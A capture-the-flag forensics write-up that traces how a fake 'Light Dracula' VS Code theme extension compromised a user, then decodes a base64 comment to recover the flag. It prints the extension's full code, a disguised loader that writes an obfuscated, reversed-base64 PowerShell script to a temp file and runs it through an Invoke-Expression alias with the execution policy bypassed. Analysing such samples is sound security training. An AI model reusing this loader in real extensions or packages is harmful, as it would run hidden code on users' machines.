# ViruS Camp 1
## Description
> Alice was just hired as a junior dev and she is absolutely obsessed with light themes. While customizing her work laptop she suddenly found out that their top secret flag was encrypted. Can you figure out how this happened and uncover a few flags in the process?
>
> https://drive.google.com/file/d/1i2D_rbLjuqAIqtcqipuT95sHcTAOLCBC/view?usp=sharing

## Solution

Open the AD1 file using FTK Imager. You will see the file directories of user `vboxuser`.

![image](https://github.com/user-attachments/assets/cf01f073-1dc8-44e7-869c-471c8aafb5f8)

The challenge title gives some hints to analyze VS Code (notice the upper case letters). If Alice installed a custom light theme extension, you can find it in the extensions folder.

```
C:\Users\vboxuser\.vscode\extensions
```
Open `undefined_publisher.activate-0.0.1` folder and you see several files. `package.json` mentions that the theme is called `Light Dracula`. We are in the correct path.

```json
name": "activate",
	"displayName": "Light Dracula",
	"description": "",
	"version": "0.0.1",
	"engines": {
		"vscode": "^1.96.0"
	
```
Navigate to `out` folder and click to `extension.js`. There are two base64 encoded strings in this file but we will focus on the first flag. The first flag is at the bottom of the file

```js
"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.activate = activate;
exports.deactivate = deactivate;
const vscode = __importStar(require("vscode"));
const child_process_1 = require("child_process");
const fs = __importStar(require("fs"));
function activate(context) {
    const command = vscode.commands.registerCommand("rs", () => {
        const scriptContent = `$wy7qIGPnm36HpvjrL2TMUaRbz = "K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ" ;
$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2>&1> $null ;
$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
$9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;`;
        const scriptPath = `C:\\Users\\vboxuser\\AppData\\Local\\Temp\\temp0001`;
        try {
            fs.writeFileSync(scriptPath, scriptContent);
            vscode.window.showInformationMessage(`The light mode will activate in a few minutes.`);
        }
        catch (error) {
            vscode.window.showErrorMessage(`Error activating light mode.`);
        }
        (0, child_process_1.exec)(`powershell.exe -ExecutionPolicy Bypass -File "${scriptPath}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Stderr: ${stderr}`);
            }
            console.log(`Stdout: ${stdout}`);
        });
    });
    context.subscriptions.push(command);
}
// VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9
function deactivate() { }
//# sourceMappingURL=extension.js.map

```

Convert this from base64 using CyberChef.
```
// VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9
```
![image](https://github.com/user-attachments/assets/3b0d0906-8b73-41ce-8a44-151e4000f460)


## Flag
```
BITSCTF{H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c}
```
